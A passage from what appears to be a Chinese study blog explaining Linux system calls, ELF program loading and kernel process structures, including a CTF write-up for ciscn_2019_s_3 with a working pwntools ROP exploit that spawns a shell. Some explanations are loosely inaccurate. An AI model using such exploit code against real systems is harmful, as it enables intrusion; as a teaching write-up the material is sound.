title="内核模式与用户模式"></a>内核模式与用户模式</h2><p>上面之前介绍过操作系统内核管理计算机的硬件资源，这里就会容易让人想那么我们是不是可以通过使用内核中特定的一些功能模块，来直接访问内核中维护的一些数据结构。</p><p>众所周知，我们现在运行的操作系统都是一个多任务、多用户的操作系统，如果我们每一个用户进程都可以随便访问内核中的模块，改变状态，那整个操作系统就会是处于不稳定的状态，安全性直接降低。</p><p>为了将内核程序与用户程序隔离开，在硬件层面上提供了一次机制，将程序执行的状态分为了不同的级别，从0到3，数字越小，访问级别越高。0代表内核态，在该特权级别下，所有内存上的数据都是可见的，可访问的。3代表用户态，在这个特权级下，程序只能访问一部分的内存区域，只能执行一些限定的指令。</p><p>操作系统在建立GTD表的时候，将GTD的每个表项中的2位（4种特权级别）设置为特权位（DPL），然后操作系统将整个内存分为不同的段，不同的段，在GDT对应的表项中的DPL位是不同的。比如内核内存段的所有特权位都为00。而用户程序访存时，在保护模式下都是通过段寄存器+IP寄存器来访问的，而段寄存器里则用两位表示当前进程的级别（CPL），是位于内核态还是用户态。</p><p>操作系统为了实现系统调用，提供了一个主动进入内核的惟一方式：中断指令int。int指令会将GDT表中的DPL改为3，让我们可以访问内核中的函数。所以所有的系统调用都必须通过调用int指令来实现，大致的过程如下：</p><ol><li>用户程序中包含一段包含int指令的代码</li><li>操作系统写中断处理，获取相调程序的编号</li><li>操作系统根据编号执行相应的代码</li></ol><h2 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h2><p>以这个调用xyz（）函数为例：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/b-1.jpg"></p><p>如上图所示，系统调用的流程如下：<br>1、应用程序代码调用系统调用（xyz），该函数是一个包装系统调用的库函数</p><p>2、库函数（xyz）负责准备向内核传递的参数，并触发软中断以切换到内核</p><p>3、CPU被软中断打断后，执行中断处理函数，即系统调用处理函数（system_call）</p><p>4、系统调用处理函数调用系统调用服务例程（sys_xyz），真正开始处理该系统调用。</p><h2 id="执行态切换"><a href="#执行态切换" class="headerlink" title="执行态切换"></a>执行态切换</h2><p>应用程序与库函数之间，系统调用处理函数与系统调用服务例程之间，均是普通的函数调用，应该不难理解，而库函数与系统调用处理函数之间，由于设计用户与内核态的切换，要复杂一些。</p><p>Linux通过软中断实现从用户态到内核态的切换。用户态与内核态是独立的执行流。因此在切换时，需要准备执行栈并保存寄存器。</p><p>内核实现了很多不同的系统调用(提供不同功能)，而<strong>系统调用处理函数</strong>只有一个。 因此，用户进程必须传递一个参数用于区分，这便是<strong>系统调用号</strong> ( <em>system call number</em> )。 在 <em>Linux</em> 中， <strong>系统调用号</strong>一般通过<em>eax</em><strong>寄存器</strong>来传递。</p><p>小结一下，总的执行态切换的过程就是：</p><ol><li><strong>应用程序</strong> 在 <strong>用户态</strong> 准备好调用参数，执行 <em>int</em> 指令触发 <strong>软中断</strong> ，中断号为 <em>0x80</em> ；</li><li><em>CPU</em> 被软中断打断后，执行对应的 <strong>中断处理函数</strong> ，这时便已进入 <strong>内核态</strong> ；</li><li><strong>系统调用处理函数</strong> 准备 <strong>内核执行栈</strong> ，并保存所有 <strong>寄存器</strong> (一般用汇编语言实现)；</li><li><strong>系统调用处理函数</strong> 根据 <strong>系统调用号</strong> 调用对应的 <em>C</em> 函数—— <strong>系统调用服务例程</strong> ；</li><li><strong>系统调用处理函数</strong> 准备 <strong>返回值</strong> 并从 <strong>内核栈</strong> 中恢复 <strong>寄存器</strong> ；</li><li><strong>系统调用处理函数</strong> 执行 <em>ret</em> 指令切换回 <strong>用户态</strong> ；</li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h3><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/b-2.png"></p><p>可以看出该程序是个64位的程序，放入ida中：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/b-3.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/b-4.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/b-5.png"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/b-6.png"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/b-7.png"></p><p>于是我们可以构造exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ciscn_s_3'</span><span class="token punctuation">)</span><span class="token comment">#p=remote('node4.buuoj.cn',29304)</span>vuln<span class="token operator">=</span><span class="token number">0x4004ed</span>pop_rdi<span class="token operator">=</span><span class="token number">0x4005a3</span>pop_regs<span class="token operator">=</span><span class="token number">0x40059a</span>mov_addr<span class="token operator">=</span><span class="token number">0x400580</span>mov_rax<span class="token operator">=</span><span class="token number">0x4004e2</span>syscall<span class="token operator">=</span><span class="token number">0x400517</span>payload1<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>binsh_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x148</span>payload2<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_regs<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mov_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打通结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/b-8.png"></p><p>ps：具体的解题过程可以去参考我的第八周刷题笔记。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>系统调用开始接触还是在微机原理这课程中第一次体会到，当时开始学习只知道一些固定的结果，不会与实际应用相结合，这次的通过具体的题目，进而让我更加去了解题目背后所覆盖的知识点，让我对系统调用具有更深刻的印象。</p>]]></content>
      
      
      <categories>
          
          <category> 系统调用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统调用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序装载与进程结构-2</title>
      <link href="/uncategorized/%E7%A8%8B%E5%BA%8F%E8%A3%85%E8%BD%BD%E4%B8%8E%E8%BF%9B%E7%A8%8B%E7%BB%93%E6%9E%84-2/"/>
      <url>/uncategorized/%E7%A8%8B%E5%BA%8F%E8%A3%85%E8%BD%BD%E4%B8%8E%E8%BF%9B%E7%A8%8B%E7%BB%93%E6%9E%84-2/</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍在linux系统上，可执行文件如何变为内存中进程的整个流程。</p><h3 id="0x00-程序装载"><a href="#0x00-程序装载" class="headerlink" title="0x00 程序装载"></a>0x00 程序装载</h3><p>首先，一个终端始终处于等待执行的状态，它其实就是一个进程，当我们输入ls、mv和cp等命令时，它会解析命令并执行相应的命令，这些命令都是可执行文件，它们被存储在不同的文件目录中，一般这些文件都具有全局变量的属性，这是因为我们设置好了它们的环境变量，如下所示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240414214040335.png" alt="image-20240414214040335"></p><p>查看全局环境变量时，输入env命令即可。接下来证明一下ls、cp和mv等命令都属于可执行文件，当我们使用这些命令时，操作系统会优先从上面的环境变量中去找，我们可以查看ls命令对应的可执行文件在哪个位置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">which</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240414221754512.png" alt="image-20240414221754512"></p><p>&#x2F;usr&#x2F;bin&#x2F;这个目录是存在于上面的环境变量里面的，接下来我们就进入&#x2F;usr&#x2F;bin&#x2F;目录下查看ls文件</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240414222059484.png" alt="image-20240414222059484"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240414222135566.png" alt="image-20240414222135566"></p><p>同样的mv和cp命令对应的可执行文件也可以在这个目录下面查找到</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240414222303201.png" alt="image-20240414222303201"></p><p>ok，既然我们可以将环境变量中的可执行文件作为bash终端的一个命令，那么我们同样也可以将我们自己编写的程序作为终端的命令，刚开始我的想法是将我desktop上的一个可执行文件移入到&#x2F;usr&#x2F;bin&#x2F;目录中，但是得到了下面的结果：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240414223759560.png" alt="image-20240414223759560"></p><p>具体的原因我也不是很清楚，可能是与mv这个程序本身设置有关吧。后面我又换了一种想法，那就是将我的桌面环境添加到环境变量”$PATH”中去，试试这样可不可行，如下所示：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240414233423697.png" alt="image-20240414233423697"></p><p>环境变量已经添加完毕，接下来我创建了一个test.c文件，并将其编译成名为”aaaa”的可执行文件，代码如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">add</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将其编译并运行：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240414234517201.png" alt="image-20240414234517201"></p><p>ok，理论上来说，我们可以在任意的目录下输入”aaaa”这个命令，最后终端会输出”3”，测试如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240414234722041.png" alt="image-20240414234722041"></p><p>测试成功，解释完毕。既然这样的话，那么是否会有这么一个问题：为什么我们需要在当前目录下的可执行文件前面加上”.&#x2F;“符号才能运行？其实在前面加”.&#x2F;“表示的意思是当前目录，我们在终端输入命令其实是给execve函数传递参数（可以在终端输入可执行文件的完整路径，同样可以运行）。execve函数是什么？它是一个系统调用函数，在linux系统中，一个进程通过fork函数来创建另外一个进程，创建的子进程完全复制父进程的资源，在子进程中通过使用execve系统调用函数来创建一个自己的进程，即将指定的文件名或者路径名找到可执行文件，并用来取代从父进程fork过来的数据段、代码段和堆栈段，在执行完之后，原调用的进程内容除了进程号之外，其他全部被替换了，最终可执行文件也就变为了进程。</p><p>上面介绍了可执行文件变为进程的整体过程，接下来介绍可执行文件装载的过程。<br>装载可执行文件一般采用覆盖装入（overlay）和页映射（paging）两种方法，目前主要使用页映射。最开始我们创建一个进程，然后装载相应的可执行文件并执行，最开始只需要做三件事情：<br>①创建一个独立的虚拟地址空间，主要是分配一个页目录；<br>②读取可执行文件的头，并且建立虚拟地址空间和可执行文件的映射关系。将可执行文件映射到虚拟地址空间，即磁盘中文件的物理页和进程虚拟地址空间的映射，这样当我们将cpu执行虚拟页中的地址时，会从磁盘中找到并copy至内存中；<br>③将cpu的指令寄存器设置为可执行文件的入口地址，启动运行。从elf文件中的入口地址开始执行程序。<br>bash进程调用fork之后创建一个新的进程，然后新的进程调用execve系统调用函数执行指定的elf文件，bash进程继续返回等待新进程执行结束，然后重新等待用户输入命令，execve系统调用函数定义在unistd.h文件中，其原型如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> filename<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中这三个参数分别为可执行文件名，执行参数，环境变量，glibc对execve系统调用进行了包装，提供了execl(),execlp(),execle(),execv().execvp()等五个不同形式的exec系列API，它们只是在调用的参数形式上有所区别，但最终都会调用到execve()这个系统调用函数上。</p><p>调用execve系统调用之后，再调用内核的入口sys_execve，sys_execve进行一些参数的检查复制之后，调用do_execve()，因为可执行文件不止elf一种，还有java程序和以”#!”开始的脚本程序等，所以do_execve()会首先检查被执行文件，读取前128个字节，特别是开头4个字节的魔数（Magic），用来判断可执行文件的格式，如果是解释型语言的脚本，前两个字节”#!”就构成了魔数，系统一旦判断到这两个字节，就对后面的字符串进行解析，以确定程序解释器的路径。当do_execve()读取了这128个字节的文件头部之后，然后调用search_binary_handle()去搜索和匹配合适的可执行文件装载处理的过程。Linux中所有被支持的可执行文件格式都有相应的装载处理过程，search_binary_handle()会通过判断文件头部的魔数确定文件的格式，并调用相应的装载处理过程。如ELF用load_elf_binary()、a.out用load_aout_binary()，脚本用load_script()。其中ELF装载过程的主要步骤是：<br>①检查ELF可执行文件格式的有效性，比如魔数、程序头表中段(Segment)的数量；<br>②寻找动态链接的”.interp”段（该段保存可执行文件所需要的动态链接器的路径），设置动态链接器的路径；<br>③根据ELF可执行文件的程序头表的描述，对ELF文件进行映射，比如代码、数据、只读数据；<br>④初始化ELF进程环境，比如进程启动时edx寄存器的地址应该是DT_FINI的地址（结束代码地址）；<br>⑤将系统调用的返回地址修改成ELF可执行文件的入口点，这个入口点取决于程序的链接方式，对于静态链接的ELF可执行文件，这个程序入口就是ELF文件的文件头中e_enEry所指的地址，对于动态链接的可执行文件，程序入口点是动态链接器。</p><p>当load_elf_binary()执行完毕，返回至do_execve()再返回到sys_execve()，上面的第⑤步中已经把系统调用的返回地址改为了被装载的ELF程序的入口地址。所以当sys_execve()系统调用从内核态返回到用户态时，eip寄存器直接跳转到了ELF程序的入口地址，于是新的程序开始执行，ELF可执行文件装载完成。</p><h3 id="0x01-进程结构"><a href="#0x01-进程结构" class="headerlink" title="0x01 进程结构"></a>0x01 进程结构</h3><p>前面讲的内容全部都是有关可执行文件装载的过程，我们经常听到可执行文件在内存中以进程的形式存在，进程都有自己的虚拟地址空间。虚拟地址空间其实只是个抽象的概念，实际上虚拟地址空间是一个结构体(由多个vm_area_struct组成)，这里我再仔细介绍一下。<br>Linux进程结构主要涉及三个结构体task_struct、mm_struct、vm_area_struct。<br>先放几张进程结构的图：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240415205844966.png" alt="image-20240415205844966"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240415211640615.png" alt="image-20240415211640615"></p><p><strong>(1) task_struct</strong><br>task_struct是Linux系统中的进程控制块（PCB），内部包含了一个进程所需的各项信息。其中mm_struct *mm则表示进程所拥有的内存空间描述。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//表示进程当前运行状态</span>    <span class="token comment">//volatile避免了读取缓存在寄存器中的脏数据，而是直接从内存中取</span>    <span class="token comment">//-1 不可运行  0 可运行的  >0 暂停状态</span><span class="token keyword">volatile</span> <span class="token keyword">long</span> state<span class="token punctuation">;</span><span class="token comment">/* -1 unrunnable, 0 runnable, >0 stopped */</span><span class="token keyword">struct</span> <span class="token class-name">thread_info</span> <span class="token operator">*</span>thread_info<span class="token punctuation">;</span><span class="token class-name">atomic_t</span> usage<span class="token punctuation">;</span><span class="token comment">//进程标记符 flags反映进程的状态信息，用于内核标识当前进程的状态</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">;</span><span class="token comment">/* per process flags, defined below */</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> ptrace<span class="token punctuation">;</span><span class="token keyword">int</span> lock_depth<span class="token punctuation">;</span><span class="token comment">/* Lock depth */</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">//mm进程所拥有的内存空间描述符，对于内核线程的mm为NULL</span><span class="token comment">//activi_mm进程运行时所使用的进程描述符</span><span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm<span class="token punctuation">,</span> <span class="token operator">*</span>active_mm<span class="token punctuation">;</span><span class="token comment">/* task state */</span><span class="token keyword">struct</span> <span class="token class-name">linux_binfmt</span> <span class="token operator">*</span>binfmt<span class="token punctuation">;</span><span class="token keyword">int</span> exit_code<span class="token punctuation">,</span> exit_signal<span class="token punctuation">;</span><span class="token keyword">int</span> pdeath_signal<span class="token punctuation">;</span>  <span class="token comment">/*  The signal sent when the parent dies  */</span><span class="token comment">/* ??? */</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> personality<span class="token punctuation">;</span><span class="token keyword">int</span> did_exec<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//进程的唯一标识</span><span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span><span class="token class-name">pid_t</span> __pgrp<span class="token punctuation">;</span><span class="token comment">/* Accessed via process_group() */</span><span class="token class-name">pid_t</span> tty_old_pgrp<span class="token punctuation">;</span><span class="token class-name">pid_t</span> session<span class="token punctuation">;</span><span class="token comment">//线程组标识符</span><span class="token class-name">pid_t</span> tgid<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>(2) mm_struct</strong></p><p>mm_struct是进程的内存描述，其中说明了代码段、数据段的起始和结束位置，堆的起始结束位置，栈的起始位置，特别注意这里，pgd指针其指向进程的页目录，虚拟地址到物理地址的转换（包括虚拟地址到磁盘中文件的地址、虚拟地址到内存中物理地址）<br>valid为1，表示page在主存中，对应项为物理地址；<br>valid为0，表示page不在主存而在闪存或者磁盘中，对应项为辅存中地址。</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240415214305651.png" alt="image-20240415214305651"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//vm_area_struct的链表</span><span class="token keyword">struct</span> <span class="token class-name">vm_area_struct</span> <span class="token operator">*</span> mmap<span class="token punctuation">;</span><span class="token comment">/* list of VMAs */</span><span class="token keyword">struct</span> <span class="token class-name">rb_root</span> mm_rb<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">vm_area_struct</span> <span class="token operator">*</span> mmap_cache<span class="token punctuation">;</span><span class="token comment">/* last find_vma result */</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> free_area_cache<span class="token punctuation">;</span><span class="token comment">/* first hole */</span><span class="token comment">//指向进程的页目录，虚拟地址到物理地址的转换</span><span class="token comment">//Linux中每个进程有它自己的PGD(Page Global Directory)，它是一个物理页，并包含一个pdg_t数组</span><span class="token class-name">pgd_t</span> <span class="token operator">*</span> pgd<span class="token punctuation">;</span><span class="token class-name">atomic_t</span> mm_users<span class="token punctuation">;</span><span class="token comment">/* How many users with user space? */</span><span class="token class-name">atomic_t</span> mm_count<span class="token punctuation">;</span><span class="token comment">/* How many references to "struct mm_struct" (users count as 1) */</span><span class="token comment">//vm_area_struct的数量</span><span class="token keyword">int</span> map_count<span class="token punctuation">;</span><span class="token comment">/* number of VMAs */</span><span class="token keyword">struct</span> <span class="token class-name">rw_semaphore</span> mmap_sem<span class="token punctuation">;</span><span class="token class-name">spinlock_t</span> page_table_lock<span class="token punctuation">;</span><span class="token comment">/* Protects task page tables and mm->rss */</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> mmlist<span class="token punctuation">;</span><span class="token comment">/* List of all active mm's.  These are globally strung * together off init_mm.mmlist, and are protected * by mmlist_lock */</span>    <span class="token comment">//代码段起始、结束位置，数据段起始、结束位置</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> start_code<span class="token punctuation">,</span> end_code<span class="token punctuation">,</span> start_data<span class="token punctuation">,</span> end_data<span class="token punctuation">;</span><span class="token comment">//堆的起始、结束位置，栈的起始位置，栈因为其性质，只有起始位置</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> start_brk<span class="token punctuation">,</span> brk<span class="token punctuation">,</span> start_stack<span class="token punctuation">;</span><span class="token comment">//参数段、环境段的起始结束位置</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg_start<span class="token punctuation">,</span> arg_end<span class="token punctuation">,</span> env_start<span class="token punctuation">,</span> env_end<span class="token punctuation">;</span><span class="token comment">//total_vm映射的page数量</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> rss<span class="token punctuation">,</span> total_vm<span class="token punctuation">,</span> locked_vm<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> def_flags<span class="token punctuation">;</span><span class="token class-name">cpumask_t</span> cpu_vm_mask<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> swap_address<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> saved_auxv<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">/* for /proc/PID/auxv */</span><span class="token keyword">unsigned</span> dumpable<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_HUGETLB_PAGE</span></span><span class="token keyword">int</span> used_hugetlb<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token comment">/* Architecture-specific MM context */</span><span class="token class-name">mm_context_t</span> context<span class="token punctuation">;</span><span class="token comment">/* coredumping support */</span><span class="token keyword">int</span> core_waiters<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">completion</span> <span class="token operator">*</span>core_startup_done<span class="token punctuation">,</span> core_done<span class="token punctuation">;</span><span class="token comment">/* aio bits */</span><span class="token class-name">rwlock_t</span>ioctx_list_lock<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">kioctx</span><span class="token operator">*</span>ioctx_list<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">kioctx</span>default_kioctx<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>(3) vm_area_struct</strong></p><p>在Linux中，每个segment用一个vm_area_struct结构体表示。每一个vm_area_struct的大小为4K的整数倍，即一页的整数倍。vm_area_struct使用链表和红黑树来组织。在进程地址空间中查找vm_area_struct是非常频繁的操作，比如发生page fault时，使用链表找到与特定地址关联的vm_area_struct时，其时间复杂度是O(N)，使用红黑树的时间复杂度是O(log2N)，尤其在vm_area_struct数量很多的时候，可以显著减少查找所需的时间，同时红黑树是一种非平衡二叉树，可以简化重新平衡树的过程。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">vm_area_struct</span> <span class="token punctuation">&#123;</span><span class="token comment">//vm_area_struct所属的mm_struct</span><span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span> vm_mm<span class="token punctuation">;</span><span class="token comment">/* The address space we belong to. */</span><span class="token comment">//该虚拟内存空间的首地址</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> vm_start<span class="token punctuation">;</span><span class="token comment">/* Our start address within vm_mm. */</span><span class="token comment">//该虚拟内存空间的尾地址</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> vm_end<span class="token punctuation">;</span><span class="token comment">/* The first byte after our end address   within vm_mm. */</span>    <span class="token comment">//vm_area_struct链的下一个成员</span><span class="token comment">/* linked list of VM areas per task, sorted by address */</span><span class="token keyword">struct</span> <span class="token class-name">vm_area_struct</span> <span class="token operator">*</span>vm_next<span class="token punctuation">;</span><span class="token class-name">pgprot_t</span> vm_page_prot<span class="token punctuation">;</span><span class="token comment">/* Access permissions of this VMA. */</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> vm_flags<span class="token punctuation">;</span><span class="token comment">/* Flags, listed below. */</span>    <span class="token comment">//将本vm_area_struct作为一个节点加入到红黑树中</span><span class="token keyword">struct</span> <span class="token class-name">rb_node</span> vm_rb<span class="token punctuation">;</span><span class="token comment">/* * For areas with an address space and backing store, * one of the address_space->i_mmap&#123;,shared&#125; lists, * for shm areas, the list of attaches, otherwise unused. */</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> shared<span class="token punctuation">;</span><span class="token comment">/* Function pointers to deal with this struct. */</span><span class="token keyword">struct</span> <span class="token class-name">vm_operations_struct</span> <span class="token operator">*</span> vm_ops<span class="token punctuation">;</span><span class="token comment">/* Information about our backing store: */</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> vm_pgoff<span class="token punctuation">;</span><span class="token comment">/* Offset (within vm_file) in PAGE_SIZE   units, *not* PAGE_CACHE_SIZE */</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span> vm_file<span class="token punctuation">;</span><span class="token comment">/* File we map to (can be NULL). */</span><span class="token keyword">void</span> <span class="token operator">*</span> vm_private_data<span class="token punctuation">;</span><span class="token comment">/* was vm_pte (shared mem) */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" 